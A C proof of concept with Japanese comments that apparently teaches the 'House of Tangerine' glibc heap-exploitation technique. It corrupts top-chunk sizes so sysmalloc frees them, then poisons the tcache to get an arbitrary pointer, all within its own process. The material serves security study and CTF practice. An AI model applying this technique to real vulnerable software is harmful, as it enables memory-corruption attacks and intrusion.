#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <assert.h>
#include <malloc.h>
#include <unistd.h>

#define SIZE_SZ sizeof(size_t)

#define CHUNK_HDR_SZ (SIZE_SZ*2)
// x86_64 と x86 で共通です
#define MALLOC_ALIGN 0x10L
#define MALLOC_MASK (-MALLOC_ALIGN)

#define PAGESIZE sysconf(_SC_PAGESIZE)
#define PAGE_MASK (PAGESIZE-1)

// fencepost は、解放する前に top から取り除かれるオフセットです
#define FENCEPOST (2*CHUNK_HDR_SZ)

#define PROBE (0x20-CHUNK_HDR_SZ)

// poison された tcache に使うサイズ
#define CHUNK_SIZE_1 0x40
#define SIZE_1 (CHUNK_SIZE_1-CHUNK_HDR_SZ)

// より小さい複数の確保に分割することもできます
#define CHUNK_SIZE_3 (PAGESIZE-(2*MALLOC_ALIGN)-CHUNK_SIZE_1)
#define SIZE_3 (CHUNK_SIZE_3-CHUNK_HDR_SZ)

/**
 * GLIBC 2.34 (x86_64, x86, aarch64) と 2.39 (x86_64, x86, aarch64) でテストしています
 *
 * House of Tangerine は House of Orange を現代化したもので、
 * free() を直接呼ばなくてもヒープを破壊できます
 *
 * sysmalloc 内で top_chunk (wilderness) に対して行われる _int_free の呼び出しを利用します
 * https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L2913
 *
 * tcache-poisoning を使い、tcache の freelist を悪用して、malloc をだまして
 * malloc のアラインメントに合った任意のポインタを返させます。(2.32 以降ではヒープのリークが必要です)
 *
 * このバージョンは、正方向と負方向の OOB (例: BOF)、
 * または前のチャンクを編集する際の正方向の OOB を前提としています
 *
 * このバージョンは、malloc 呼び出しが 5 回 (6 回*)、OOB が 3 回必要です
 *
 *  *PoC をより確実にするために、malloc して現在の top chunkのサイズを調べる必要があります。
 *  実際のエクスプロイトでは予測できるはずなので、これを省いて malloc 呼び出しを 5 回にできます
 *
 * Pico CTF 2024 の問題 "High Frequency Troubles" を作成し、
 * この攻略技法のきっかけを与えてくれた pepsipu に特に感謝します
 */
int main() {
  size_t size_2, *top_size_ptr, top_size, new_top_size, freed_top_size, vuln_tcache, target, *heap_ptr;
  long win[2] __attribute__ ((aligned (0x10)));
  // バッファリングを無効にします
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);

  // すべてのチャンクサイズがアラインされているか確認します
  assert((CHUNK_SIZE_1 & MALLOC_MASK) == CHUNK_SIZE_1);
  assert((CHUNK_SIZE_3 & MALLOC_MASK) == CHUNK_SIZE_3);

  puts("定数:");
  printf("チャンクヘッダ = 0x%lx\n", CHUNK_HDR_SZ);
  printf("malloc のアラインメント = 0x%lx\n", MALLOC_ALIGN);
  printf("ページのアラインメント = 0x%lx\n", PAGESIZE);
  printf("fencepost のサイズ = 0x%lx\n", FENCEPOST);
  printf("size_1 = 0x%lx\n", SIZE_1);

  printf("対象の tcache 先頭のサイズ = 0x%lx\n", CHUNK_HDR_SZ + MALLOC_ALIGN + CHUNK_SIZE_1);

  // target は malloc のアラインメント 0x10 に合わせます。
  // glibc-2.42 の次のパッチ以降: https://patchwork.sourceware.org/project/glibc/patch/20250206213709.2394624-2-benjamin.p.kallus.gr@dartmouth.edu/
  // 対象チャンクの size を設定する必要があります
  target = (size_t) &win[0];
  win[1] = 0x41;

  // top_chunk の現在のサイズを調べます。
  // すでに分かっている場合や予測できる場合は省略できます
  heap_ptr = malloc(PROBE);
  top_size = heap_ptr[(PROBE / SIZE_SZ) + 1];
  printf("最初の top のサイズ = 0x%lx\n", top_size);

  // size_2 を計算します

  size_2 = top_size - CHUNK_HDR_SZ - (2 * MALLOC_ALIGN) - CHUNK_SIZE_1;
  size_2 &= PAGE_MASK;
  size_2 &= MALLOC_MASK;


  printf("size_2 = 0x%lx\n", size_2);

  // 最初の確保
  heap_ptr = malloc(size_2);

  // BOF または OOB を使って top_chunk を破壊します
  top_size_ptr = &heap_ptr[(size_2 / SIZE_SZ) - 1 + (MALLOC_ALIGN / SIZE_SZ)];

  top_size = *top_size_ptr;

  printf("最初の top のサイズ = 0x%lx\n", top_size);

  // 破壊した top の size がページにアラインされている(一般には 0x1000)ようにします
  // https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L2599
  new_top_size = top_size & PAGE_MASK;
  *top_size_ptr = new_top_size;
  printf("新しい最初の top のサイズ = 0x%lx\n", new_top_size);

  // top_chunk から fencepost を取り除き、解放されるサイズを求めます
  // https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L2895
  freed_top_size = (new_top_size - FENCEPOST) & MALLOC_MASK;
  assert(freed_top_size == CHUNK_SIZE_1);

  /*
   * available_top_size より大きい malloc を行い、_int_free を使って以前の top_chunk を解放します。
   * これは sysmalloc の内部で起こり、top_chunk は併合できない場合に解放されます
   * https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L2913
   * top_chunk の size を小さくすることで、併合されないようにします
   * また、PAGE_MASK のビットを変えないことで、破壊チェックも回避できます
   */

  printf("size_3 = 0x%lx\n", SIZE_3);
  heap_ptr = malloc(SIZE_3);

  top_size = heap_ptr[(SIZE_3 / SIZE_SZ) + 1];
  printf("現在の top のサイズ = 0x%lx\n", top_size);

  // 破壊した top の size がページにアラインされている(一般には 0x1000)ようにします
  new_top_size = top_size & PAGE_MASK;
  heap_ptr[(SIZE_3 / SIZE_SZ) + 1] = new_top_size;
  printf("新しい top のサイズ = 0x%lx\n", new_top_size);

  // top_chunk から fencepost を取り除き、解放されるサイズを求めます
  freed_top_size = (new_top_size - FENCEPOST) & MALLOC_MASK;
  printf("解放された top_chunk のサイズ = 0x%lx\n", freed_top_size);

  assert(freed_top_size == CHUNK_SIZE_1);

  // 以前の top_chunk を解放します
  heap_ptr = malloc(SIZE_3);

  // これが tcache poisoning に使う vuln_tcache になります
  vuln_tcache = (size_t) &heap_ptr[(SIZE_3 / SIZE_SZ) + 2];

  printf("tcache の next ポインタ: 0x%lx\n", vuln_tcache);

  // 上の手順をもう一度行い、チャンクをもう 1 つ解放して、small bin から tcache へチャンクを移せるようにします
  printf("上の手順を繰り返して、空きチャンクをもう 1 つ得ます\n");
  top_size = heap_ptr[(SIZE_3 / SIZE_SZ) + 1];
  new_top_size = top_size & PAGE_MASK;
  heap_ptr[(SIZE_3 / SIZE_SZ) + 1] = new_top_size;
  heap_ptr = malloc(SIZE_3); // 解放を実行します
  printf("これで、もう 1 回確保すると、残りの 2 つのチャンクが tcache に移ります\n");
  void *pad = malloc(SIZE_1); // small bin から 1 つチャンクを確保して、他のチャンクを tcache に移します

  printf("これで、tcache poisoning を行えます。\n");
  // next ポインタを破壊して、target を指すようにします
  // ヒープのリークを使って safe-linking を回避します (GLIBC 2.32 以降)
  heap_ptr[(vuln_tcache - (size_t) heap_ptr) / SIZE_SZ] = target ^ (vuln_tcache >> 12);

  // 最初の tcache を確保します(次の tcache bin が破壊されています)
  heap_ptr = malloc(SIZE_1);

  // 読み書き用の任意のポインタを得ます
  heap_ptr = malloc(SIZE_1);

  // heap_ptr が target と同じ文字列を指すようになったことの確認
  assert((size_t) heap_ptr == target);
  puts("成功です! 全体を通して、free() 関数は一度も使っていません。");
}
